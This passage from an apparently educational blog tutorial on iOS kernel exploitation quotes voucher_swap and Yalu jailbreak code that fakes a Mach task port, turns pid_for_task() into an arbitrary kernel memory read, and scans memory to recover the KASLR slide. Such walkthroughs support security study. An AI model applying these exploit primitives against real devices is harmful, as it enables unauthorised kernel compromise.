        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;the maths is wrong somewhere, fake task doesn't fit in message&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

      &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;// set the ref_count field of the fake task:&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_TASK_REF_COUNT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xd00d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// leak references&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;// make sure the task is active&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_TASK_ACTIVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;// set the vm_map of the fake task:&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_TASK_VM_MAP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;// set the task lock type of the fake task's lock:&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;For more details, i highly recommend checking out the this talk from CanSecWest &lt;a href=&quot;https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;pid_for_task-arbitrary-read-technique&quot;&gt;pid_for_task() arbitrary read technique&lt;/h2&gt;

&lt;p&gt;As discussed earlier, the &lt;strong&gt;pid_for_task&lt;/strong&gt; Mach Trap will give out the &lt;strong&gt;PID&lt;/strong&gt; of the corresponding task. It looks up the &lt;strong&gt;bsd_info&lt;/strong&gt; field in the task struct which points to the corresponding BSD &lt;strong&gt;proc&lt;/strong&gt; struct in the kernel, and reads the &lt;strong&gt;p_pid&lt;/strong&gt; value. Assuming the &lt;strong&gt;p_pid&lt;/strong&gt; field is at an offset of 0x10, and let’s say the address you want to read is &lt;strong&gt;addr&lt;/strong&gt;, you can create a fake port, which then links to a fake task such that the &lt;strong&gt;bsd_info&lt;/strong&gt; field in the task is &lt;strong&gt;addr - 0x10&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The following code from the voucher_swap exploit tries to do just that.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;cm&quot;&gt;/*
     * stage1_read32
     *
     * Description:
     * 	Read a 32-bit value from kernel memory using our fake port.
     *
     * 	This primitive requires that we know the address of the pipe buffer containing our port.
     */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;stage1_read32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Do a read to make the pipe available for a write.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;read_pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Create our fake task. The task's proc's p_pid field overlaps with the address we want to&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// read.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_proc_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ref_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bsd_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_proc_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Initialize the port as a fake task port pointing to our fake task.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_port_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io_makebits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOT_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_TASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_kobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Write our buffer to kernel memory.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;write_pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Now use pid_for_task() to read our value.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_for_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s returned %d: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;pid_for_task&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_error_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;could not read kernel memory in stage %d using %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;pid_for_task&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Just combine the method twice and you can now read 64 bits at a time.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;cm&quot;&gt;/*
     * stage1_read64
     *
     * Description:
     * 	Read a 64-bit value from kernel memory using our stage 1 read primitive.
     */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;stage1_read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    		&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stage1_read32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stage1_read32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It is important to note that the offsets keep changing with different versions of iOS and its even different for different devices. These offsets are found both by looking at the kernel source code and also by looking at the kernelcache file.&lt;/p&gt;

&lt;p&gt;This technique is very powerful and allows you to scour the kernel memory 4 bytes at a time. Another very important use case for is function is to find the kernel slide. All they have to do is to start reading the kernel memory backwards four bytes at a time until you get to the magic value &lt;strong&gt;0xfeedfacf&lt;/strong&gt;. This address will denote the base address of the kernel, subtract it from the start address on the kernelcache when opened with IDA or Hopper and you will get the kernel slide. The following code from the Yalu jailbreak does just that.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;     &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;int32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leaked&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// The offset from the start of &quot;struct task&quot; to &quot;task-&amp;gt;bsd_info&quot; seems to be fixed to 0x360, but this is prone to change anytime in the future as apple sees fit&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// It'd be nice to use a heuristic method like how K33n Team does it with the cpu_clock thing&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;faketask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;procoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leaked_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// This tries to read a value from &quot;task-&amp;gt;bsd_info-&amp;gt;p_pid&quot; which translates to &quot;faketask-&amp;gt;bsd_info-&amp;gt;p_pid = (leaked_ptr - 0x10)-&amp;gt;p_pid = leaked_ptr&quot;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;pid_for_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foundport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leaked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// Is it 0xfeedfacf?&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leaked&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MH_MAGIC_64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;NSLog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;found kernel text at %llx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leaked_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// Retreat one page and search again&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;leaked_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Found kernel base!&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leaked_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;.....................&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;.....................&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Calculating KASLR slide&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;slide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;slide&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFFFFFF007004000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

